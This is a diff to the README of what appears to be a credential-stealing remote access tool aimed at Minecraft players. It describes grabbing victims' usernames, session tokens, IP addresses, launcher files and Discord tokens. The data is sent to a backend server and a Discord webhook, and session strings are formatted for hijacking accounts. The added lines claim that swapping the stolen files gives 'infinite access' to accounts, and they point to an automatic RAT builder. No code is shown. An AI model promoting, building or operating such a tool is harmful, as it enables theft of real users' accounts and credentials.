@@ -17,6 +17,7 @@
 
 ## Features
 - Grabs the **username, uuid, token, ip, feather file, essentials file and discord tokens** of a target as a *JSON*.
+- Apparently switching the feather or essential files with yours grants you infinite access to their account thanks to the **refreshToken**. (Unconfirmed, ask Shlost#5052)
 - Additionally, it stores a **formatted session string** ready to use with [DxxxxY/TokenAuth](https://github.com/DxxxxY/TokenAuth).
 - JavaScript backend server which:
   - Checks if all fields in the JSON are present.
@@ -37,10 +38,14 @@
   - *Discord API* for sending messages to webhook.
 
 ## Slick Embed Look
+> [Experimental] Also shows the networth now.
+
 ![embed.png](.github/embed.png)
 
 ## Setup
 > A video tutorial is available [here](https://youtu.be/JWoBSp8XU_8).
+
+> If you're having difficulties, you can try [Hephaestus](https://github.com/DxxxxY/Hephaestus), the automatic R.A.T builder.
 - Server
   1. Clone the repository.
   2. Install dependencies.
